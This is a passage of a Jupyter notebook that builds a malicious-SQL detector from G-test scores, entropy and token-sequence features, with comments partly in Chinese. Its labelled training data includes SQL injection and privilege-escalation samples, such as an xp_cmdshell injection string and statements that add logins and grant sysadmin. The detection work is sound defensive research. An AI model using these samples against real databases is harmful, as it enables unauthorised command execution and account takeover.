   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \\\n",
       "0  [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...   \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "3              [Keyword, Identifier, IdentifierList]   \n",
       "4              [Keyword, Identifier, IdentifierList]   \n",
       "\n",
       "                                           sequences  \n",
       "0  [('Single',), ('Identifier',), ('Float',), ('F...  \n",
       "1  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...  \n",
       "2  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...  \n",
       "3  [('Keyword',), ('Identifier',), ('IdentifierLi...  \n",
       "4  [('Keyword',), ('Identifier',), ('IdentifierLi...  "
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Grubbs' Test:\n",
    "    Grubbs' Test可理解为检验最大值、最小值偏离均值的程度是否为异常。\n",
    "\n",
    "<br>\n",
    "<div align=center><img src=\"./g_test.jpg\"/></div>\n",
    "<br>\n",
    "\n",
    "\n",
    "-------------------------------------------------------------------------------------------- `E 是均值，O是观测值` ---------------------------------------------------------------------------------------\n",
    "\n",
    "<br>\n",
    "\n",
    "<div align=center><img src=\"./g_test2.jpg\"/></div>\n",
    "\n",
    "为了将 `Grubbs' Test` 扩展到 k 个异常值检测，需要在数据集中逐步删除与均值偏离最大的值（即最大值或最小值），同步更新对应的 t分布临界值，检验原假设是否成立。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>legit</th>\n",
       "      <th>malicious</th>\n",
       "      <th>legit_cd</th>\n",
       "      <th>malicious_cd</th>\n",
       "      <th>total_cd</th>\n",
       "      <th>legit_exp</th>\n",
       "      <th>legit_g</th>\n",
       "      <th>malicious_exp</th>\n",
       "      <th>malicious_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>('Single',)</th>\n",
       "      <td>6.0</td>\n",
       "      <td>10991.0</td>\n",
       "      <td>0.000546</td>\n",
       "      <td>0.999454</td>\n",
       "      <td>10997.0</td>\n",
       "      <td>1175.751968</td>\n",
       "      <td>-63.334845</td>\n",
       "      <td>9821.248032</td>\n",
       "      <td>2473.602607</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Single', 'Identifier')</th>\n",
       "      <td>0.0</td>\n",
       "      <td>8309.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>8309.0</td>\n",
       "      <td>888.362563</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>7420.637437</td>\n",
       "      <td>1879.068770</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Punctuation',)</th>\n",
       "      <td>149.0</td>\n",
       "      <td>7811.0</td>\n",
       "      <td>0.018719</td>\n",
       "      <td>0.981281</td>\n",
       "      <td>7960.0</td>\n",
       "      <td>851.048983</td>\n",
       "      <td>-519.271967</td>\n",
       "      <td>7108.951017</td>\n",
       "      <td>1471.253402</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier',)</th>\n",
       "      <td>1269.0</td>\n",
       "      <td>16947.0</td>\n",
       "      <td>0.069664</td>\n",
       "      <td>0.930336</td>\n",
       "      <td>18216.0</td>\n",
       "      <td>1947.576416</td>\n",
       "      <td>-1087.168917</td>\n",
       "      <td>16268.423584</td>\n",
       "      <td>1385.071580</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier', 'Single')</th>\n",
       "      <td>1.0</td>\n",
       "      <td>4221.0</td>\n",
       "      <td>0.000237</td>\n",
       "      <td>0.999763</td>\n",
       "      <td>4222.0</td>\n",
       "      <td>451.398091</td>\n",
       "      <td>-12.224699</td>\n",
       "      <td>3770.601909</td>\n",
       "      <td>952.573504</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Single', 'Identifier', 'Single')</th>\n",
       "      <td>0.0</td>\n",
       "      <td>4170.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>4170.0</td>\n",
       "      <td>445.838475</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>3724.161525</td>\n",
       "      <td>943.039689</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier', 'Single', 'Identifier')</th>\n",
       "      <td>0.0</td>\n",
       "      <td>4162.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>4162.0</td>\n",
       "      <td>444.983149</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>3717.016851</td>\n",
       "      <td>941.230500</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier', 'Identifier')</th>\n",
       "      <td>1.0</td>\n",
       "      <td>3956.0</td>\n",
       "      <td>0.000253</td>\n",
       "      <td>0.999747</td>\n",
       "      <td>3957.0</td>\n",
       "      <td>423.065430</td>\n",
       "      <td>-12.095054</td>\n",
       "      <td>3533.934570</td>\n",
       "      <td>892.644140</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Keyword', 'DML', 'IdentifierList')</th>\n",
       "      <td>32.0</td>\n",
       "      <td>3157.0</td>\n",
       "      <td>0.010034</td>\n",
       "      <td>0.989966</td>\n",
       "      <td>3189.0</td>\n",
       "      <td>340.954172</td>\n",
       "      <td>-151.424779</td>\n",
       "      <td>2848.045828</td>\n",
       "      <td>650.273334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Punctuation', 'Punctuation')</th>\n",
       "      <td>1.0</td>\n",
       "      <td>2858.0</td>\n",
       "      <td>0.000350</td>\n",
       "      <td>0.999650</td>\n",
       "      <td>2859.0</td>\n",
       "      <td>305.671990</td>\n",
       "      <td>-11.445025</td>\n",
       "      <td>2553.328010</td>\n",
       "      <td>644.333067</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         legit  malicious  legit_cd  \\\n",
       "('Single',)                                6.0    10991.0  0.000546   \n",
       "('Single', 'Identifier')                   0.0     8309.0  0.000000   \n",
       "('Punctuation',)                         149.0     7811.0  0.018719   \n",
       "('Identifier',)                         1269.0    16947.0  0.069664   \n",
       "('Identifier', 'Single')                   1.0     4221.0  0.000237   \n",
       "('Single', 'Identifier', 'Single')         0.0     4170.0  0.000000   \n",
       "('Identifier', 'Single', 'Identifier')     0.0     4162.0  0.000000   \n",
       "('Identifier', 'Identifier')               1.0     3956.0  0.000253   \n",
       "('Keyword', 'DML', 'IdentifierList')      32.0     3157.0  0.010034   \n",
       "('Punctuation', 'Punctuation')             1.0     2858.0  0.000350   \n",
       "\n",
       "                                        malicious_cd  total_cd    legit_exp  \\\n",
       "('Single',)                                 0.999454   10997.0  1175.751968   \n",
       "('Single', 'Identifier')                    1.000000    8309.0   888.362563   \n",
       "('Punctuation',)                            0.981281    7960.0   851.048983   \n",
       "('Identifier',)                             0.930336   18216.0  1947.576416   \n",
       "('Identifier', 'Single')                    0.999763    4222.0   451.398091   \n",
       "('Single', 'Identifier', 'Single')          1.000000    4170.0   445.838475   \n",
       "('Identifier', 'Single', 'Identifier')      1.000000    4162.0   444.983149   \n",
       "('Identifier', 'Identifier')                0.999747    3957.0   423.065430   \n",
       "('Keyword', 'DML', 'IdentifierList')        0.989966    3189.0   340.954172   \n",
       "('Punctuation', 'Punctuation')              0.999650    2859.0   305.671990   \n",
       "\n",
       "                                            legit_g  malicious_exp  \\\n",
       "('Single',)                              -63.334845    9821.248032   \n",
       "('Single', 'Identifier')                   0.000000    7420.637437   \n",
       "('Punctuation',)                        -519.271967    7108.951017   \n",
       "('Identifier',)                        -1087.168917   16268.423584   \n",
       "('Identifier', 'Single')                 -12.224699    3770.601909   \n",
       "('Single', 'Identifier', 'Single')         0.000000    3724.161525   \n",
       "('Identifier', 'Single', 'Identifier')     0.000000    3717.016851   \n",
       "('Identifier', 'Identifier')             -12.095054    3533.934570   \n",
       "('Keyword', 'DML', 'IdentifierList')    -151.424779    2848.045828   \n",
       "('Punctuation', 'Punctuation')           -11.445025    2553.328010   \n",
       "\n",
       "                                        malicious_g  \n",
       "('Single',)                             2473.602607  \n",
       "('Single', 'Identifier')                1879.068770  \n",
       "('Punctuation',)                        1471.253402  \n",
       "('Identifier',)                         1385.071580  \n",
       "('Identifier', 'Single')                 952.573504  \n",
       "('Single', 'Identifier', 'Single')       943.039689  \n",
       "('Identifier', 'Single', 'Identifier')   941.230500  \n",
       "('Identifier', 'Identifier')             892.644140  \n",
       "('Keyword', 'DML', 'IdentifierList')     650.273334  \n",
       "('Punctuation', 'Punctuation')           644.333067  "
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# The data hacking repository has a simple stats module we're going to use\n",
    "# import data_hacking.simple_stats as ss\n",
    "\n",
    "# Spin up our g_test class\n",
    "g_test = GTest()\n",
    "\n",
    "# Here we'd like to see how various sql tokens and transitions are related.\n",
    "# Is there an association with particular token sets and malicious SQL statements.\n",
    "tokens, types = token_expansion(dataframe['sequences'], dataframe['type'])\n",
    "df_ct, df_cd, df_stats,a,b,c,d = g_test.highest_gtest_scores(tokens, types, matches=0, N=0)\n",
    "\n",
    "df_stats.sort_values('malicious_g', ascending=0).head(10)\n",
    "\n",
    "# The table below shows raw counts, conditional distributions, expected counts, and g-test score.\n",
    "# ('Single',)malicious_exp = 10997.0 * 121739 /136313.0 = 9821.248032102587 = 本身个数 * malicious个数 / (legit个数 + malicious个数)\n",
    "# ('Single',)malicious_g = 2.0 * 10991.0 * math.log(10991.0/9821.248032) = 2473.602607 \n",
    "#                                                                       = 2 * malicious值 * math.log(malicious值/malicious_exp值)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Plotting defaults\n",
    "import matplotlib.pyplot as plt\n",
    "# 使用%matplotlib命令可以将matplotlib的图表直接嵌入到Notebook之中\n",
    "%matplotlib inline\n",
    "# ref: https://matplotlib.org/users/customizing.html#matplotlib-rcparams\n",
    "# matplotlib的全局设置参数\n",
    "plt.rcParams['font.size'] = 18.0 # The font.size property is the default font size for text, given in pts.\n",
    "plt.rcParams['figure.figsize'] = 15.0, 8.0 # figure size in inches\n",
    "\n",
    "# A plotting helper method\n",
    "def plot_it(df,label_x,label_y):\n",
    "    fig, ax = plt.subplots(subplot_kw={'facecolor':'#EEEEE5'})\n",
    "    ax.grid(color='grey', linestyle='solid')\n",
    "    df.T.plot(kind='bar', logx=False, rot=0, ax=ax, colormap='PiYG')\n",
    "    ax.legend(loc=5, prop={'size':14})\n",
    "    plt.subplots_adjust(left=0, right=1.2, bottom=0, top=1, wspace=0, hspace=0)\n",
    "    plt.xlabel(label_x)\n",
    "    plt.ylabel(label_y)\n",
    "    return ax"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Figure size 864x576 with 0 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1080x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Now plot the the head() and the tail() of the dataframe to see who's been naughty or nice\n",
    "plt.figure(figsize=(12,8))\n",
    "\n",
    "sorted_df = df_stats.sort_values('malicious_g', ascending=0)\n",
    "naughty = sorted_df.head(7)\n",
    "nice = sorted_df.tail(7).sort_values('malicious_g', ascending=0)\n",
    "naughty_and_nice = pd.concat([naughty, nice])\n",
    "ax = plot_it(naughty_and_nice[['malicious_g']],'SQL Command Types','G-Test Scores')\n",
    "#ax.set_xlim(.2, 1.4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>length</th>\n",
       "      <th>entropy</th>\n",
       "      <th>malicious_g</th>\n",
       "      <th>legit_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>13</td>\n",
       "      <td>4.028603</td>\n",
       "      <td>-465.234450</td>\n",
       "      <td>1469.098948</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>grant connect to name; grant resource to name;</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Keyword, Keyword, Identifier, Punctu...</td>\n",
       "      <td>[('Keyword',), ('Keyword',), ('Keyword',), ('I...</td>\n",
       "      <td>10</td>\n",
       "      <td>3.498879</td>\n",
       "      <td>-343.227660</td>\n",
       "      <td>1176.295590</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>insert into users(login, password, level) valu...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DML, Keyword, Function, Keyword, Punctuation,...</td>\n",
       "      <td>[('DML',), ('Keyword',), ('Function',), ('Keyw...</td>\n",
       "      <td>6</td>\n",
       "      <td>4.387660</td>\n",
       "      <td>-257.889574</td>\n",
       "      <td>651.176909</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>CREATE FUNCTION sylph.add_article(char, char, ...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Identifier...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>9</td>\n",
       "      <td>4.948830</td>\n",
       "      <td>-39.722704</td>\n",
       "      <td>789.261804</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>47</th>\n",
       "      <td>CREATE FUNCTION sylph.add_comment(integer, cha...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Identifier...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>9</td>\n",
       "      <td>5.019598</td>\n",
       "      <td>-35.360658</td>\n",
       "      <td>782.124867</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                              raw_sql       type  \\\n",
       "2   create user name identified by pass123 tempora...  malicious   \n",
       "6      grant connect to name; grant resource to name;  malicious   \n",
       "7   insert into users(login, password, level) valu...  malicious   \n",
       "46  CREATE FUNCTION sylph.add_article(char, char, ...      legit   \n",
       "47  CREATE FUNCTION sylph.add_comment(integer, cha...      legit   \n",
       "\n",
       "                                           parsed_sql  \\\n",
       "2   [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "6   [Keyword, Keyword, Keyword, Identifier, Punctu...   \n",
       "7   [DML, Keyword, Function, Keyword, Punctuation,...   \n",
       "46  [DDL, Keyword, Identifier, Keyword, Identifier...   \n",
       "47  [DDL, Keyword, Identifier, Keyword, Identifier...   \n",
       "\n",
       "                                            sequences  length   entropy  \\\n",
       "2   [('DDL',), ('Keyword',), ('Identifier',), ('Ke...      13  4.028603   \n",
       "6   [('Keyword',), ('Keyword',), ('Keyword',), ('I...      10  3.498879   \n",
       "7   [('DML',), ('Keyword',), ('Function',), ('Keyw...       6  4.387660   \n",
       "46  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       9  4.948830   \n",
       "47  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       9  5.019598   \n",
       "\n",
       "    malicious_g      legit_g  \n",
       "2   -465.234450  1469.098948  \n",
       "6   -343.227660  1176.295590  \n",
       "7   -257.889574   651.176909  \n",
       "46   -39.722704   789.261804  \n",
       "47   -35.360658   782.124867  "
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe[dataframe['sequences'].map(lambda x: \"('Punctuation',)\" in x)].head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "上面的结果是“合法”和“恶意”的混合包。 正如我们所期望的那样 ('Punctuation') 不能真正用作'签名'来有效区分恶意 sql 语句。 然而，将数据转换为已解析的标记有助于我们概括并找到有趣的恶意模式，这很酷。\n",
    "\n",
    "因此，即使这些单独的特征不能用于区分……当我们构建一组特征的“特征向量”时，机器学习算法可以使用这些向量来构建非线性功能决策边界 在多维空间中（我们在这一点上笑了，因为在说了一堆花哨的东西之后很难把自己当回事......）。 顺便说一句，该图像完全不合逻辑。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"'; exec master..xp_cmdshell 'ping 10.10.1.2'--\""
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = dataframe['raw_sql'][0]\n",
    "a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Counter({' ': 4,\n",
       "         \"'\": 3,\n",
       "         '-': 2,\n",
       "         '.': 5,\n",
       "         '0': 2,\n",
       "         '1': 3,\n",
       "         '2': 1,\n",
       "         ';': 1,\n",
       "         '_': 1,\n",
       "         'a': 1,\n",
       "         'c': 2,\n",
       "         'd': 1,\n",
       "         'e': 4,\n",
       "         'g': 1,\n",
       "         'h': 1,\n",
       "         'i': 1,\n",
       "         'l': 2,\n",
       "         'm': 2,\n",
       "         'n': 1,\n",
       "         'p': 2,\n",
       "         'r': 1,\n",
       "         's': 2,\n",
       "         't': 1,\n",
       "         'x': 2})"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "p, lns = Counter(a), float(len(a))\n",
    "p"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "46.0"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4.368792054344757"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "-sum( count/lns * math.log(count/lns, 2) for count in p.values())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 熵的计算公式：\n",
    "\n",
    "<div align=center><img width=\"500\" height=\"300\" src=\"./Entropy.jpg\"/></div>\n",
    "\n",
    "对应下方：\n",
    "\n",
    "    -sum( count/lns * math.log(count/lns, 2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>length</th>\n",
       "      <th>entropy</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "      <td>7</td>\n",
       "      <td>4.368792</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>6</td>\n",
       "      <td>4.037326</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>13</td>\n",
       "      <td>4.028603</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.030493</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.010013</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \\\n",
       "0  [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...   \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "3              [Keyword, Identifier, IdentifierList]   \n",
       "4              [Keyword, Identifier, IdentifierList]   \n",
       "\n",
       "                                           sequences  length   entropy  \n",
       "0  [('Single',), ('Identifier',), ('Float',), ('F...       7  4.368792  \n",
       "1  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       6  4.037326  \n",
       "2  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...      13  4.028603  \n",
       "3  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.030493  \n",
       "4  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.010013  "
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Generating additional feature dimensions for the machine learning to expand its mind into...\n",
    "# We're basically building up features to include into our 'feature vector' for ML\n",
    "import math\n",
    "from collections import Counter\n",
    "def entropy(s):\n",
    "    p, lns = Counter(s), float(len(s))                                         # Counter 会统计每个字符出现的次数，lns 为总长度\n",
    "    return -sum( count/lns * math.log(count/lns, 2) for count in p.values()) # math.log(count/lns, 2) 以2为底数\n",
    "dataframe['length'] = dataframe['parsed_sql'].map(lambda x: len(x))           # parsed_sql 的长度\n",
    "dataframe['entropy'] = dataframe['raw_sql'].map(lambda x: entropy(x))         # 计算 raw_sql 的熵\n",
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 对于每个 SQL 语句，将恶意和合法的 g-test 分数聚合为特征\n",
    "import numpy as np\n",
    "def g_aggregate(sequence, name):\n",
    "    try:\n",
    "        g_scores = [df_stats.loc[item][name] for item in sequence]\n",
    "    except KeyError:\n",
    "        return 0\n",
    "    return sum(g_scores)/len(g_scores) if g_scores else 0 # Average\n",
    "dataframe['malicious_g'] = dataframe['sequences'].map(lambda x: g_aggregate(x, 'malicious_g'))\n",
    "dataframe['legit_g'] = dataframe['sequences'].map(lambda x: g_aggregate(x, 'legit_g'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>length</th>\n",
       "      <th>entropy</th>\n",
       "      <th>malicious_g</th>\n",
       "      <th>legit_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "      <td>7</td>\n",
